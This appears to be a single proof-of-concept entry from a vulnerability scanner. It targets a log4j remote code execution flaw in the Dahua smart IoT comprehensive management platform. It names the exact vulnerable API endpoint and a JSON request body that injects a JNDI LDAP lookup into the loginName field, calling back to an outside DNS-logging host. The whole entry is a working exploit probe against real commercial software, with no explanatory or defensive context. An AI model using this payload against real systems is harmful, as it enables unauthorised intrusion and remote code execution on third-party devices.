{
        'name': '大华智能物联综合管理平台 log4j远程代码执行漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/evo-apigw/evo-brm/1.2.0/user/is-exist',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'Content-Type': 'application/json;charset=utf-8'
            },
            'data': '{{"loginName":"${{jndi:ldap://{}}}"}}',
            'dnslog': True,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }}]
    }